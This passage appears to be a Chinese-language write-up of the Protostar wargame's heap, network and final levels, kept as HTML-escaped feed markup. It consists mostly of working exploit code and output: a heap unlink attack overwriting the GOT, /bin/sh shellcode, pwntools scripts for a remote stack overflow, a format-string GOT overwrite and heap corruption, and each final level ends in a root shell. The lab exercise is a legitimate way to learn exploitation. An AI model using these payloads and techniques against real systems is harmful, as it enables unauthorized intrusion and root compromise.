[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;auth &amp;#x27;+&amp;#x27;a&amp;#x27;*30;print &amp;#x27;reset&amp;#x27;;print &amp;#x27;service&amp;#x27;+&amp;#x27;a&amp;#x27;*33;print &amp;#x27;login&amp;#x27;&amp;quot; | .&amp;#x2F;heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
$ python -c &amp;quot;print &amp;#x27;auth &amp;#x27;;print &amp;#x27;service&amp;#x27;+&amp;#x27;a&amp;#x27;*17;print &amp;#x27;login&amp;#x27;&amp;quot; | .&amp;#x2F;heap2
[ auth = (nil), service = (nil) ]
[ auth = 0x804c008, service = (nil) ]
[ auth = 0x804c008, service = 0x804c018 ]
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;heap-3&quot;&gt;Heap 3&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ ltrace .&amp;#x2F;heap3 aaaa aaaa aaaa
__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &amp;lt;unfinished ...&amp;gt;
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096
sbrk(4096)                                             = 0x0804c000
sbrk(0)                                                = 0x0804d000
strcpy(0x0804c008, &amp;quot;aaaa&amp;quot;)                             = 0x0804c008
strcpy(0x0804c030, &amp;quot;aaaa&amp;quot;)                             = 0x0804c030
strcpy(0x0804c058, &amp;quot;aaaa&amp;quot;)                             = 0x0804c058
puts(&amp;quot;dynamite failed?&amp;quot;dynamite failed?
)           
$ ltrace -S .&amp;#x2F;heap3 aaaa aaaa aaaa
SYS_brk(NULL)                                          = 0x0804c000
SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                    = 0
SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                    = 0
SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                    = 0
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;suid-debug&amp;quot;, 00)                      = -2
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.nohwcap&amp;quot;, 00)                   = -2
SYS_mmap2(0, 8192, 3, 34, -1)                          = 0xb7fe0000
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.preload&amp;quot;, 04)                   = -2
SYS_open(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.cache&amp;quot;, 0, 00)                    = 3
SYS_fstat64(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3)  = 0
SYS_mmap2(0, 13796, 1, 2, 3)                           = 0xb7fdc000
SYS_close(3)                                           = 0
SYS_access(&amp;quot;&amp;#x2F;etc&amp;#x2F;ld.so.nohwcap&amp;quot;, 00)                   = -2
SYS_open(&amp;quot;&amp;#x2F;lib&amp;#x2F;libc.so.6&amp;quot;, 0, 00)                      = 3
SYS_read(3, &amp;quot;\177ELF\001\001\001&amp;quot;, 512)                = 512
SYS_fstat64(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) = 0
SYS_mmap2(0, 0x144948, 5, 2050, 3)                     = 0xb7e97000
SYS_mprotect(0xb7fd5000, 4096, 0)                      = 0
SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)               = 0xb7fd6000
SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)                = 0xb7fd9000
SYS_close(3)                                           = 0
SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7e96000
SYS_set_thread_area(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0
SYS_mprotect(0xb7fd6000, 8192, 1)                      = 0
SYS_mprotect(0xb7ffe000, 4096, 1)                      = 0
SYS_munmap(0xb7fdc000, 13796)                          = 0
__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &amp;lt;unfinished ...&amp;gt;
sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096
sbrk(4096 &amp;lt;unfinished ...&amp;gt;
SYS_brk(NULL)                                          = 0x0804c000
SYS_brk(0x0804d000)                                    = 0x0804d000
&amp;lt;... sbrk resumed&amp;gt; )                                   = 0x0804c000
sbrk(0)                                                = 0x0804d000
strcpy(0x0804c008, &amp;quot;aaaa&amp;quot;)                             = 0x0804c008
strcpy(0x0804c030, &amp;quot;aaaa&amp;quot;)                             = 0x0804c030
strcpy(0x0804c058, &amp;quot;aaaa&amp;quot;)                             = 0x0804c058
puts(&amp;quot;dynamite failed?&amp;quot; &amp;lt;unfinished ...&amp;gt;
SYS_fstat64(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) = 0
SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7fdf000
SYS_write(1, &amp;quot;dynamite failed?\n&amp;quot;, 17dynamite failed?
)                 = 17
&amp;lt;... puts resumed&amp;gt; )                                   = 17
SYS_exit_group(17 &amp;lt;no return ...&amp;gt;
+++ exited (status 17) +++
$ objdump -tTR heap3 | grep winner
08048864 g     F .text  00000025              winner
$ objdump -tTR heap3 | grep puts
00000000       F *UND*  00000000              puts@@GLIBC_2.0
00000000      DF *UND*  00000000  GLIBC_2.0   puts
0804b128 R_386_JUMP_SLOT   puts
$ .&amp;#x2F;heap3 `python -c &amp;#x27;print &amp;quot;\x90&amp;quot;*14 + &amp;quot;\x68\x64\x88\x04\x08\xc3&amp;quot; + &amp;quot;A&amp;quot;*12 + &amp;quot;\xf8\xff\xff\xff&amp;quot; + &amp;quot;\xfc\xff\xff\xff&amp;quot;&amp;#x27;` `python -c &amp;#x27;print &amp;quot;\xde\xad\xbe\xef&amp;quot;*2+&amp;quot;\x1c\xb1\x04\x08&amp;quot;+&amp;quot;\x08\xc0\x04\x08&amp;quot;&amp;#x27;` C
that wasn&amp;#x27;t too bad now, was it? @ 1532745821
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;xue-xi-zi-liao&quot;&gt;学习资料&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;turingh.github.io&#x2F;2015&#x2F;12&#x2F;12&#x2F;%E5%9B%BE%E8%A7%A3dwordshoot&#x2F;&quot;&gt;图解DWORDSHOOT&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;turingh.github.io&#x2F;2015&#x2F;12&#x2F;14&#x2F;protostar-heap3&#x2F;&quot;&gt;protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;net-0&quot;&gt;Net 0&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *

r = remote(&amp;quot;192.168.116.137&amp;quot;, 2999)
s = r.recv()
pos = s.find(&amp;quot;\&amp;#x27;&amp;quot;, 13)
num = int(s[13:pos])
r.sendline(p32(num))
print r.recv()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;net-1&quot;&gt;Net 1&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import struct

r = remote(&amp;quot;192.168.116.137&amp;quot;, 2998)
s = r.recv()
# print s
num = struct.unpack(&amp;quot;I&amp;quot;, s)
# print num
r.sendline(str(num[0]))
print r.recv()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;net-2&quot;&gt;Net 2&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import struct

r = remote(&amp;quot;192.168.116.137&amp;quot;, 2997)
num = 0
for i in range(0, 4):
  s = r.recv(4)
  num += int(struct.unpack(&amp;quot;&amp;lt;I&amp;quot;, s)[0])
num &amp;amp;= 0xffffffff
r.sendline(p32(num))
print r.recv()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;final-0&quot;&gt;Final 0&lt;&#x2F;h1&gt;
&lt;p&gt;首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import struct

r = remote(&amp;quot;192.168.116.137&amp;quot;, 2995)
shellcode = &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;
payload = &amp;#x27;\x00&amp;#x27;+ shellcode + &amp;#x27;\x90&amp;#x27;*(532-len(shellcode)-1)+p32(0xbffffa49)
r.sendline(payload)
r.interactive()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~&amp;#x2F;Documents&amp;#x2F;Protostar# python final0.py 
[+] Opening connection to 192.168.116.137 on port 2995: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;final-1&quot;&gt;Final 1&lt;&#x2F;h1&gt;
&lt;p&gt;syslog原型为&lt;code&gt;void syslog(int priority, const char *format, ...);&lt;&#x2F;code&gt;看第二个参数名字就懂了吧，查看需要在有权限的情况下看&lt;code&gt;&#x2F;var&#x2F;log&#x2F;syslog&lt;&#x2F;code&gt;文件&lt;&#x2F;p&gt;
&lt;p&gt;然后就是尝试咯&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ objdump -tTR final1 | grep puts
00000000       F *UND*  00000000              puts@@GLIBC_2.0
00000000      DF *UND*  00000000  GLIBC_2.0   puts
0804a194 R_386_JUMP_SLOT   puts
$ objdump -tTR final1 | grep username
0804a220 g     O .bss   00000080              username
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import struct

shellcode = &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;
ret = 0x0804a194
payload = shellcode+&amp;#x27;\x90&amp;#x27;*2+p32(ret)+p32(ret+1)+p32(ret+2)+p32(ret+3)+&amp;#x27;%24$01968d&amp;#x27;+&amp;#x27;%26$hn&amp;#x27;+&amp;#x27;%24$039452d&amp;#x27;+&amp;#x27;%24$hn&amp;#x27;
r = remote(&amp;quot;192.168.116.137&amp;quot;, 2994)
r.recv()
r.sendline(&amp;quot;username &amp;quot;+payload)
r.recv()
r.sendline(&amp;quot;login &amp;quot;+&amp;quot; &amp;quot;*24)
r.interactive()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~&amp;#x2F;Documents&amp;#x2F;Protostar# python final1.py 
[+] Opening connection to 192.168.116.137 on port 2994: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;final-2&quot;&gt;Final 2&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import struct

shellcode = &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;

r = remote(&amp;quot;192.168.116.137&amp;quot;, 2993)
r.send(&amp;quot;FSRD&amp;quot; + &amp;quot;A&amp;quot;*(128-4-1) + &amp;quot;&amp;#x2F;&amp;quot;)  
r.sendline(&amp;quot;FSRD&amp;quot; + &amp;quot;ROOT&amp;quot; + &amp;quot;\x90&amp;quot;*(128-len(shellcode)-4-4-1-4-4-4-4) + shellcode + &amp;quot;&amp;#x2F;&amp;quot; + &amp;quot;\xfc\xff\xff\xff&amp;quot; + &amp;quot;\xfc\xff\xff\xff&amp;quot; + &amp;quot;\x10\xd4\x04\x08&amp;quot; + &amp;quot;\x98\xe0\x04\x08&amp;quot; )

r.interactive()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~&amp;#x2F;Documents&amp;#x2F;Protostar# python final2.py 
[+] Opening connection to 192.168.116.137 on port 2993: Done
[*] Switching to interactive mode
Process OK
$ id
uid=0(root) gid=0(root) groups=0(root)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
</feed>
